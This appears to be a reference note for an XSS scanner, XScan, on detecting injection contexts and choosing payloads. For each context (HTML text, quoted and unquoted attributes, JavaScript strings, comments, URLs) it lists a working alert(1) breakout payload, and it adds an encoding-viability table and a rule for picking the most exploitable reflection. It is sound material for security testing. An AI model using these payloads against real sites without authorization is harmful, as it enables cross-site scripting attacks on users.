---
tags: xss, context, context-detection, encoding, html-attribute, javascript-string, injection-context, tier2
category: xss
---

# XSS Context Detection and Payload Selection

## The fundamental rule

**The injection context determines the payload. Never the other way around.**

A payload that works in HTML body will fail in an attribute.
A payload that works in an attribute will fail in a JS string.
XScan detects the context first, then selects the payload.

## Context classification

### html_text
```html
<h1>Hello MARKER world</h1>
<p>Results for: MARKER</p>
```
Payload needs: `<` must be raw (not encoded)
Attack: inject tags -> `<img src=x onerror=alert(1)>`

### html_attribute (double-quoted)
```html
<input value="MARKER">
<a href="MARKER">
```
Payload needs: `"` must be raw
Attack: break out of attribute -> `" onmouseover="alert(1)`
**Even if `<` and `>` are encoded — this still works.**

### html_attribute (single-quoted)
```html
<input value='MARKER'>
```
Payload needs: `'` must be raw
Attack: `' onmouseover='alert(1)'`

### html_attribute (unquoted)
```html
<input value=MARKER>
```
Attack: ` onmouseover=alert(1) x=`

### script_string_double
```html
<script>var x = "MARKER";</script>
```
Payload needs: `"` must be raw
Attack: `"-alert(1)-"` or `";alert(1)//`

### script_string_single
```html
<script>var x = 'MARKER';</script>
```
Payload needs: `'` must be raw
Attack: `'-alert(1)-'` or `';alert(1)//`

### script_expression (bare JS)
```html
<script>return MARKER;</script>
```
Attack: `;alert(1)//`

### html_comment
```html
<!-- MARKER -->
```
Attack: `--><script>alert(1)</script>`

### url_param (href/src/action)
```html
<a href="MARKER">
```
Attack: `javascript:alert(1)`

## Encoding analysis matrix

| Encoded chars | Raw chars | Context   | Viable? | Approach |
|---------------|-----------|-----------|---------|----------|
| none          | `<>"'`    | html_text | YES     | Tag injection |
| `<>`          | `"`       | html_attr | YES     | Event handler injection |
| `<>`          | `'`       | html_attr | YES     | Event handler (single quote) |
| `<>"'`        | none      | html_attr | NO      | Fully escaped |
| `<>`          | `"`       | js_string | YES     | String breakout |
| `<>"'`        | none      | js_string | NO      | Fully escaped |

## Multi-reflection priority

When input appears in multiple locations in the same response:
1. `html_attribute` > `script_string` > `html_text` > `html_comment`

Example: search term appears in both `<h1>` (html_text) and `<input value="">` (html_attribute).
The attribute reflection is more exploitable even when angles are encoded.

**Always pick the most exploitable context, not the first occurrence.**

